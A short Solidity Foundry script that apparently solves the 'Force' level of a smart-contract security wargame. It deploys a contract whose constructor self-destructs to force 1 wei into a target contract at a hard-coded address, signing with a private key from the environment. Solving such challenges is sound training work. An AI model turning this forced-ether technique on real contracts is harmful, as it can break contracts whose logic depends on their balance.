// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/7_Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract SelfDestruct {
    constructor(address payable _backUpAddress) payable {
        selfdestruct(_backUpAddress);
    }
}

contract ForceSolution is Script {
    // # creating instance of force
    Force public force = Force(payable(0x1be5d12bcDE6d3616ae3174c0eF535B8c57Dd40b));
    // # creating refrence of self
    SelfDestruct public selfDestruct;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // ? deploying selfDestruct contract,
        // * sending 1 weth and constructor-args :: contract to whom we want to send balance.
        new SelfDestruct{value: 1 wei}(payable(address(force)));

        vm.stopBroadcast();
        
    }
}

